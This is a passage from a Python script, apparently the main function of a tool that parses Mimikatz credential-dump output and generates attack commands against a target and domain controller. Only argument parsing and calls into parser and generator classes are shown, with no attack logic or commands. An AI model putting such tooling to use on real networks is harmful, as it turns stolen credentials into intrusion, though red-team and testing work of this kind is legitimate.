    parser = argparse.ArgumentParser(description='Parse Mimikatz output and generate attack commands')
    parser.add_argument('input_file', help='Path to mimikatz output file')
    parser.add_argument('-o', '--output', help='Output file (default: stdout)')
    parser.add_argument('-t', '--target', help='Target IP/hostname', default='<TARGET>')
    parser.add_argument('-d', '--dc', help='Domain Controller IP/hostname', default='<DC_IP>')
    args = parser.parse_args()
    
    try:
        with open(args.input_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    except FileNotFoundError:
        print(f"Error: File '{args.input_file}' not found", file=sys.stderr)
        sys.exit(1)
    
    mparser = MimikatzParser(content)
    data = mparser.parse()
    
    generator = AttackGenerator(data, args.target, args.dc)
    output = generator.generate_all()
    
    if args.output:
        with open(args.output, 'w') as f:
            f.write(output)
        print(f"[+] Output written to {args.output}")
    else:
        print(output)


if __name__ == '__main__':
    main()
